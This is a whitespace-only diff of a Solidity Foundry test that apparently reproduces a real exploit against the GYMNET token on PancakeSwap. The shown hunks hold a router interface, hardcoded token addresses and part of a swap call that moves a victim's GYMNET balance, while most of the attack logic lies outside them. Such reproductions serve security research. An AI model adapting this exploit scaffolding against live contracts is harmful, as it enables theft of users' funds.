@@ -14,15 +14,18 @@ import "./../interface.sol";
 // https://twitter.com/AnciliaInc/status/1686605510655811584
 
 interface IGymRouter {
+
     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
         uint256 amountIn,
         uint256 amountOutMin,
         address[] memory path,
         address to
     ) external;
+
 }
 
 contract GYMTest is Test {
+
     IERC20 GYMNET = IERC20(0x0012365F0a1E5F30a5046c680DCB21D07b15FcF7);
     IERC20 fakeUSDT = IERC20(0x2A1ee1278a8b64fd621B46e3ee9c08071cA3A8a5);
     // PancakeSwap V2: GYMNET-fakeUSDT
@@ -142,4 +145,5 @@ contract GYMTest is Test {
             GYMNET.balanceOf(victim), amountOutMin, path, victim
         );
     }
+
 }
